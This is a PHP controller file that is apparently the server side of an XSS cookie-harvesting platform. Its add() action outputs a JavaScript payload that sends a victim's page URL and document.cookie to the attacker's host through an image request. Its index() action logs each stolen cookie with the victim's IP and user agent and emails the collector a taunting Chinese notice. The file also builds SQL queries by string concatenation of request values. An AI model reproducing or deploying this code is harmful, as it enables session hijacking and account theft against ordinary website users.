<?php
namespace Xss\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
    
       if(!isset($_GET['pid']))$this->error('Error!');
       $xss=array(
       	'pid'=>I('pid'),
       	'hash'=>I('hash'),
       	'location'=>I('location'),
       	'cookie'=>I('cookie'),
       	'time'=>time(),
       	'ua'=>$_SERVER['HTTP_USER_AGENT'],
       	'ip'=>get_client_ip(),
       	);
      $xssdata=M('x');
      $xssdata->add($xss);
     $xssnum=M("poject");
      $n=$xssnum->where('pid="'.I("pid").'"')->find();
    $num= $n['num']+1;
    $xssnum->where('pid="'.I('pid').'"')->setField('num',$num);
       $xmail=M('user');
    $email=$xmail->where('hash="'.$xss['hash'].'"')->find();
  
    
	$mailto=$email['email'];  //收件人
	$subject="开门,兄弟,你的Cookie饼干到了"; //邮件主题
	$body="<h2>Hey,哥们,你的Cookie饼干到了</h2>
<h2>饼干地址:{$xss['location']}</h2>
<h2>快回来{$_SERVER['HTTP_HOST']}收饼干吧！</h2>";
if(!mail($mailto,$subject,$body)){
sendmailto($mailto,$subject,$body);
}
    }
    
public function add(){
    	if(!isset($_GET['pid']))$this->error('Error!');
    	$addxss=array(
    	'pid'=>I('pid'),
      'hash'=>I('hash'),
    	);
 $doamin=$_SERVER['HTTP_HOST'];
 header("Content-Type:application/x-javascript");
echo <<<JS
(function() {
	(new Image()).src = 'http://{$doamin}/xss.php?hash={$addxss['hash']}&pid={$addxss['pid']}&location=' + escape((function() {
		try {
			return document.location.href
		} catch (e) {
			return ''
		}
	})()) + '&cookie=' + escape((function() {
		try {
			return document.cookie
		} catch (e) {
			return ''
		}
	})());
})();
if ('' == 1) {
	keep = new Image();
	keep.src = 'http://{$doamin}/xss.php?hash={$addxss['hash']}&pid={$addxss['pid']}&url=' + escape(document.location) + '&cookie=' + escape(document.cookie)
};
JS;
    	}
}